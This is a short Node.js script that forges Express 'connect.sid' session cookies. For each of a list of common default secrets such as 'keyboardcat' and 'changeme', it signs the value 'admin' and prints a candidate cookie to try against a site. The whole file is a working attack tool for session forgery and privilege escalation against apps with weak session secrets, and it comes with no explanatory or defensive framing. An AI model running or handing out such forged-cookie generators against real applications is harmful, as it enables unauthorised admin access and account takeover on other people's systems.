const crypto = require('crypto');
const secrets = ['keyboardcat','secret','express','changeme','password','session','qwerty','123456','admin'];
const payload = 'admin';

global.Buffer = global.Buffer || require('buffer').Buffer; // node compat

function signature(val, secret) {
    return crypto
        .createHmac('sha256', secret)
        .update(val)
        .digest('base64')
        .replace(/\=+$/, '')
        .replace(/\+/g, '-')
        .replace(/\//g, '_');
}

for (const s of secrets) {
    const sig = signature(payload, s);
    console.log('connect.sid=s:admin.' + sig + '   # secret: ' + s);
}
